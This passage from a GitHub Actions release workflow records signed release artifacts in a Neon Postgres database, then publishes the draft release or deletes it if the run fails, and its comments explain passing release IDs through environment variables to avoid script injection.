          BASE_URL="https://github.com/${GITHUB_REPO}/releases/download/${TAG}"
          IS_PRERELEASE=$( [ "${PRERELEASE}" = "true" ] && echo "true" || echo "false" )

          # Call the Neon-backed release RPC through the serverless Postgres driver.
          upsert_release() {
            local platform="$1" download_url="$2" signature="$3" file_size="$4"
            node - "$platform" "$download_url" "$signature" "$file_size" "$PUB_DATE" "$IS_PRERELEASE" <<'NODE'
          (async () => {
          const { neon } = require('@neondatabase/serverless');
          const [platform, downloadUrl, signature, fileSize, pubDate, isPrerelease] = process.argv.slice(2);
          const sql = neon(process.env.NEON_DATABASE_URL);
          await sql`
            select public.upsert_release(
              ${process.env.VERSION},
              ${platform},
              ${downloadUrl},
              ${signature},
              ${null},
              ${pubDate},
              ${Number(fileSize)},
              ${null},
              ${null},
              ${isPrerelease === 'true'},
              ${false},
              ${process.env.CHANNEL}
            )
          `;
          })().catch((error) => {
            console.error(error);
            process.exit(1);
          });
          NODE
            if [ $? -eq 0 ]; then
              echo "Updated release for ${platform}: ${VERSION}"
            else
              echo "Failed to upsert release for ${platform}" >&2
              return 1
            fi
          }

          # Platform mapping: artifact_dir platform extension
          PLATFORMS="
          linux-x64-artifacts linux-x86_64 .AppImage
          macos-universal-artifacts darwin-aarch64 .app.tar.gz
          macos-universal-artifacts darwin-x86_64 .app.tar.gz
          "

          echo "$PLATFORMS" | while read -r dir platform ext; do
            [ -z "$dir" ] && continue
            artifact_path="artifacts/${dir}"

            if [ ! -d "$artifact_path" ]; then
              echo "Required artifact directory is missing for ${platform}: ${artifact_path}" >&2
              exit 1
            fi

            # Find first matching file (excluding .sig files)
            file_path=$(find "$artifact_path" -name "*${ext}" ! -name "*.sig" -type f | head -1)
            if [ -z "$file_path" ]; then
              echo "Required updater artifact is missing for ${platform}" >&2
              exit 1
            fi

            file_name=$(basename "$file_path")
            sig_path="${file_path}.sig"

            if [ ! -f "$sig_path" ]; then
              echo "Signature not found for ${platform}: ${sig_path}" >&2
              exit 1
            fi

            signature=$(cat "$sig_path" | tr -d '\n')
            file_size=$(stat -c%s "$file_path" 2>/dev/null || stat -f%z "$file_path")
            download_url="${BASE_URL}/${file_name}"

            upsert_release "$platform" "$download_url" "$signature" "$file_size"
          done

  # ==========================================================================
  # Publish Release - Make the release public
  # ==========================================================================
  publish-release:
    name: Publish Release
    needs:
      [prepare-release, build-linux, build-macos, clean-install-linux, upgrade-from-previous-linux]
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - name: Publish release
        uses: actions/github-script@v8
        env:
          # SECURITY (C1 hardening): pass release_id via env to keep the github-script
          # body free of ${{ }} interpolation. release_id originates from a GitHub API
          # response (numeric) so it is safer than user-controlled changelog text, but
          # we use the same pattern here for consistency and defense-in-depth.
          RELEASE_ID: ${{ needs.prepare-release.outputs.release_id }}
        with:
          script: |
            const releaseId = Number(process.env.RELEASE_ID);
            if (!Number.isInteger(releaseId) || releaseId <= 0) {
              throw new Error(`Invalid release_id: ${process.env.RELEASE_ID}`);
            }
            await github.rest.repos.updateRelease({
              owner: context.repo.owner,
              repo: context.repo.repo,
              release_id: releaseId,
              draft: false
            });

            console.log('Release published successfully!');

      - name: Notify on success
        if: success()
        run: |
          echo "Release v${{ needs.prepare-release.outputs.version }} published successfully!"
          echo "Channel: ${{ needs.prepare-release.outputs.channel }}"
          echo "Pre-release: ${{ needs.prepare-release.outputs.prerelease }}"

  # ==========================================================================
  # Cleanup on Failure
  # ==========================================================================
  cleanup-on-failure:
    name: Cleanup Failed Release
    # The draft is created before validation/building. Depend on the terminal
    # publication job so failures in validate, build, or database ingestion do
    # not leave an orphan draft behind.
    needs: [prepare-release, publish-release]
    if: ${{ always() && needs.prepare-release.result == 'success' && needs.publish-release.result != 'success' }}
    runs-on: ubuntu-24.04
    permissions:
      contents: write
    steps:
      - name: Delete draft release
        uses: actions/github-script@v8
        env:
          # SECURITY (C1 hardening): same env-passthrough pattern.
          RELEASE_ID: ${{ needs.prepare-release.outputs.release_id }}
        with:
          script: |
            const raw = process.env.RELEASE_ID;
            const releaseId = raw ? Number(raw) : 0;

            if (Number.isInteger(releaseId) && releaseId > 0) {
              try {
                await github.rest.repos.deleteRelease({
                  owner: context.repo.owner,
                  repo: context.repo.repo,
                  release_id: releaseId
                });
                console.log('Draft release deleted due to build failure');
              } catch (error) {
                console.warn('Failed to delete draft release:', error.message);
              }
            }

      - name: Notify on failure
        run: |
          echo "Release build failed for v${{ needs.prepare-release.outputs.version }}"
          echo "Draft release has been cleaned up"
